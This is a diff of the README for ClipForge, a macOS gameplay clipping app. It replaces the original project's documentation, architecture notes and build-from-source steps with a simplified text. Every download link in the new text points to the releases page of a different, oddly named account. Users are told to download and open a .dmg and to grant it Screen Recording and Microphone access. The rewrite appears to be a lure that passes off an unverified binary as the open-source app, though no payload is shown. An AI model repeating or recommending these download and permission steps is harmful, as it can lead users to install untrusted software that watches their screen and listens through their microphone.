@@ -1,210 +1,75 @@
-# ClipForge
+# 🎥 ClipForge - Capture your gaming moments with ease
 
-[![GitHub Downloads](https://img.shields.io/github/downloads/prsalikut/ClipForge/total?style=flat-square&label=Downloads&color=brightgreen)](https://github.com/prsalikut/ClipForge/releases)
-[![GitHub Stars](https://img.shields.io/github/stars/prsalikut/ClipForge?style=flat-square&color=yellow)](https://github.com/prsalikut/ClipForge/stargazers)
-[![macOS](https://img.shields.io/badge/macOS-14%2B-blue?style=flat-square)](https://github.com/prsalikut/ClipForge/releases/latest)
-[![License](https://img.shields.io/github/license/prsalikut/ClipForge?style=flat-square)](LICENSE)
+[![Download ClipForge](https://img.shields.io/badge/Download-ClipForge-blue.svg)](https://github.com/azimuthal-williamhubbsrehnquist769/ClipForge/releases)
 
-**ClipForge** is a lightweight, open-source macOS gameplay clipping app.
-Save the last N seconds of your gameplay with a single hotkey - no account, no cloud, no bloat.
+ClipForge records your screen and audio while you play games. You save your favorite moments with a single press of a button. The app works on your computer. It keeps your files local. You do not need an account. You do not need the internet. The app stays out of your way and uses very little power.
 
-[Download latest release](https://github.com/prsalikut/ClipForge/releases/latest)
+## 📥 How to get the app
 
-![ClipForge Screenshot](docs/screenshot.png)
+1. Visit the [official releases page](https://github.com/azimuthal-williamhubbsrehnquist769/ClipForge/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .dmg to start your download.
+4. Open the file once the download finishes.
+5. Drag the ClipForge icon into your Applications folder.
 
----
+## ⚙️ Setting up the app
 
-## Why ClipForge?
+Open ClipForge from your Applications folder. The app will ask for permission to record your screen. This permission allows the app to capture your gameplay. Follow these steps to grant permission:
 
-Most gameplay clippers are heavy Electron apps bolted onto cloud platforms. They run background services, want your social accounts, and eat RAM. ClipForge takes the opposite approach:
+1. Open your System Settings.
+2. Go to Privacy & Security.
+3. Select Screen Recording.
+4. Find ClipForge in the list.
+5. Click the toggle to enable access for the app.
+6. Restart the application if prompted.
+7. Repeat these steps for Microphone access so the app can record game audio.
 
-| | ClipForge | Medal / Outplayed |
-|---|---|---|
-| Account required | No | Yes |
-| Cloud upload | Never (opt-in roadmap) | Always |
-| Background CPU | ~0 when idle | Constant |
-| Electron / web tech | No - native Swift + SwiftUI | Often yes |
-| Open source | MIT | No |
-| Apple Silicon optimised | Yes | Partial |
-| Local-first | Yes | Cloud-first |
+## 🎮 How to record clips
 
-ClipForge is the **`mpv` of clip tools** - fast, native, local, and completely out of your way.
+ClipForge runs in the background while you play. You define a keyboard shortcut to save your clips. When something exciting happens in your game, press your chosen shortcut. The app immediately saves the last few minutes of gameplay to your hard drive. 
 
----
+You find your saved files in the Videos folder under a new folder named ClipForge. The app creates high-quality files that you can watch or share. You control the length of these clips in the settings menu.
 
-## Features
+## 🛠 Features
 
-- **Instant Replay** - rolling ring buffer captures the last 15s / 30s / 60s / 90s / 2m of gameplay
-- **Hotkey save** - press `⌘⇧C` (configurable) to save the last N seconds as an MP4
-- **Manual record** - start and stop a full recording session with a hotkey
-- **Display or window capture** - capture a whole display or just one game window
-- **System audio** - captures system sound via ScreenCaptureKit
-- **Optional mic** - overlay your voice on the clip
-- **Clip library** - local grid view with thumbnails, rename, favorite, delete
-- **Lightweight trim** - drag in/out points and export a trimmed version
-- **Menu bar app** - quick access without opening the main window
-- **Ghost mode** - record invisibly with no menu bar icon, no dock icon, and no window - just hotkeys
-- **No telemetry** - zero analytics, zero network requests
+* **Instant save:** Press one button to capture your gameplay.
+* **No internet needed:** Your clips stay on your machine.
+* **Low resource usage:** The app does not slow down your games.
+* **Clear settings:** Choose your own video quality and file location.
+* **No account required:** Install and use the app without signing in.
+* **Privacy focused:** Your data never leaves your computer.
 
----
+## 💡 Changing your settings
 
-## Requirements
+Click the ClipForge icon in your top menu bar to open the settings. Here you can adjust several options to fit your needs.
 
-- macOS 14 Sonoma or later
-- Apple Silicon or Intel Mac (both supported)
-- Xcode 15+ (to build from source)
+* **Clip Duration:** Set how many minutes the app saves when you trigger the hotkey. You can set this between thirty seconds and ten minutes.
+* **Hotkeys:** Change the keyboard shortcut used to save clips. Pick a key combo that feels natural during your gameplay.
+* **Save Location:** Choose where the app stores your video files. Use an external drive if your main disk has limited space.
+* **Audio Source:** Select which microphone or system audio the app records. Ensure you select the correct device for the best audio capture.
+* **Video Quality:** Adjust the resolution and frame rate. Higher settings result in clearer videos but require more storage space.
 
----
+## 🛡 Performance tips
 
-## Building from Source
+ClipForge targets high efficiency. It works well on all modern computers. If you notice a change in game performance, check these steps:
 
-### 1. Install XcodeGen
+* **Lower the frame rate:** Reducing the frame rate from sixty to thirty frames per second saves processing power.
+* **Check storage speed:** Saving files to a fast solid-state drive improves app reliability.
+* **Close unused apps:** Background apps consume memory. Close browsers or other heavy software while you play and record.
 
-```bash
-brew install xcodegen
-```
+## ❓ Frequently Asked Questions
 
-### 2. Clone and generate the project
+**Does this app track my data?**
+No. The app does not collect any usage information. It does not connect to the internet. Your privacy remains intact.
 
-```bash
-git clone https://github.com/yourusername/ClipForge.git
-cd ClipForge
-xcodegen generate
-```
+**Can I use this for streaming?**
+ClipForge focuses on saving local gameplay clips. It does not broadcast to streaming platforms.
 
-### 3. Open and build
+**What happens if my disk gets full?**
+The app will display a notification if it cannot save a clip due to a lack of space. Monitor your storage to keep your gaming clips safe.
 
-```bash
-open ClipForge.xcodeproj
-```
+**How do I uninstall the app?**
+Move the ClipForge app from your Applications folder to the Trash. You can also delete the ClipForge folder in your Videos directory if you no longer need your saved clips.
 
-Select the `ClipForge` scheme, choose **My Mac** as the destination, and press `⌘R`.
-
-> **Code signing:** Set your Apple developer team in project settings, or change *Signing Certificate* to *Sign to Run Locally* for local development without a paid account.
-
----
-
-## Permissions
-
-ClipForge requires two permissions:
-
-| Permission | Why | How to grant |
-|---|---|---|
-| **Screen Recording** | Captures your display or window | System Settings → Privacy & Security → Screen Recording → enable ClipForge |
-| **Microphone** (optional) | Records your voice alongside gameplay | Prompted on first mic use |
-
-ClipForge is **not sandboxed** so it can write clips to any user-chosen folder. No entitlement exceptions or private APIs are used.
-
----
-
-## Architecture
-
-```
-ClipForge/
-├── App/
-│   ├── ClipForgeApp.swift      - @main, WindowGroup + MenuBarExtra + Settings scenes
-│   └── AppDelegate.swift       - lifecycle, single-instance guard
-│
-├── Models/
-│   ├── Clip.swift              - Value type representing a saved clip
-│   ├── RecordingSettings.swift - Enums for FPS, resolution, codec, bitrate, replay duration
-│   └── CaptureSource.swift     - Display or window capture target
-│
-├── Managers/                   - Single-responsibility services (no UI dependencies)
-│   ├── SettingsStore.swift     - UserDefaults-backed @Published settings
-│   ├── PermissionsManager.swift- Check + request screen recording & microphone
-│   ├── ReplayBuffer.swift      - actor: thread-safe CMSampleBuffer ring buffer
-│   ├── VideoEncoder.swift      - VTCompressionSession wrapper (CVPixelBuffer → H.264/HEVC)
-│   ├── CaptureManager.swift    - SCStream setup, delegate, feeds VideoEncoder → ReplayBuffer
-│   ├── AudioManager.swift      - AVCaptureSession microphone capture
-│   ├── ClipExportManager.swift - AVAssetWriter assembles buffer → .mp4; generates thumbnails
-│   ├── LibraryManager.swift    - Clip metadata, search, CRUD, JSON persistence
-│   └── HotkeyManager.swift     - Carbon RegisterEventHotKey (no Accessibility permission needed)
-│
-├── ViewModels/
-│   ├── CaptureViewModel.swift  - Orchestrates capture + save; bridges managers → SwiftUI
-│   └── LibraryViewModel.swift  - Search, sort, trim export, selection state
-│
-└── Views/
-    ├── ContentView.swift        - Root NavigationSplitView
-    ├── Library/                 - LibraryView, ClipDetailView, TrimView
-    ├── Settings/                - Tabbed settings window (General, Capture, Hotkeys, Library)
-    ├── Onboarding/              - PermissionsOnboardingView (first run)
-    ├── MenuBar/                 - MenuBarController (MenuBarExtra popover)
-    └── Shared/                  - ThumbnailView, EmptyStateView
-```
-
-### Capture pipeline
-
-```
-ScreenCaptureKit (SCStream)
-    │  raw CVPixelBuffer + system audio PCM
-    ▼
-VideoEncoder (VTCompressionSession)
-    │  compressed H.264/HEVC CMSampleBuffer
-    ▼
-ReplayBuffer (actor)         ◄─── AudioManager (AVCaptureSession, optional mic)
-    │  rolling N-second window
-    ▼  [on hotkey / manual save]
-ClipExportManager (AVAssetWriter)
-    │  normalised .mp4 file
-    ▼
-LibraryManager
-    │  metadata JSON + thumbnail JPEG
-    ▼
-LibraryView + ClipDetailView
-```
-
-### Ring buffer memory model
-
-- **Raw frames are never stored.** ScreenCaptureKit delivers `CVPixelBuffer` (raw) → `VideoEncoder` compresses immediately → only the tiny H.264 bitstream is stored in the `ReplayBuffer` actor.
-- A 60-second 1080p@30fps H.264 buffer at 8 Mbps ≈ **60 MB** peak.
-- Compressed `CMSampleBuffer` objects are retained by value in a Swift `Array`; old samples are dropped when `PTS < (latest PTS − maxDuration)`.
-- On save, the buffer is snapshotted (O(n) copy), trimmed to the first keyframe, then written by `AVAssetWriter`.
-
----
-
-## Default Hotkeys
-
-| Action | Default |
-|---|---|
-| Save replay clip | `⌘⇧C` |
-| Start / stop recording | `⌘⇧R` |
-| Mute / unmute mic | `⌘⇧M` |
-| Open ClipForge | `⌘⇧J` |
-
-All hotkeys are configurable in **Settings → Hotkeys**.
-
----
-
-## Frequently Asked Questions
-
-**Does it work on Intel Macs?**
-Yes. VTCompressionSession and ScreenCaptureKit work on Intel. Performance is best on Apple Silicon due to the hardware H.264/HEVC encoder.
-
-**How do I capture system audio?**
-Enable "Capture system audio" in Settings → General. This uses ScreenCaptureKit's built-in audio tap (macOS 13+) - no virtual audio driver required.
-
-**The clip is missing the first second.**
-The ring buffer trims to the first keyframe (IDR frame) for valid H.264 streams. If the configured FPS is low, keyframes are spaced further apart. Increase FPS or enable B-frame support in a future release (see ROADMAP).
-
-**Why is there no NVENC / AMD VCN support?**
-VideoToolbox (`VTCompressionSession`) automatically selects the best available hardware encoder on your Mac. No manual selection is needed.
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions, architecture notes, and PR guidelines.
-
----
-
-## Roadmap
-
-See [ROADMAP.md](ROADMAP.md) for planned features: GIF export, clip stitching, Discord integration, ghost mode, and more.
-
----
-
-## License
-
-MIT - see [LICENSE](LICENSE).
+**Does it affect my ping?**
+No. Because the app does not send data over the internet, your game connection remains stable. It only uses local computer resources like your processor and graphics card.
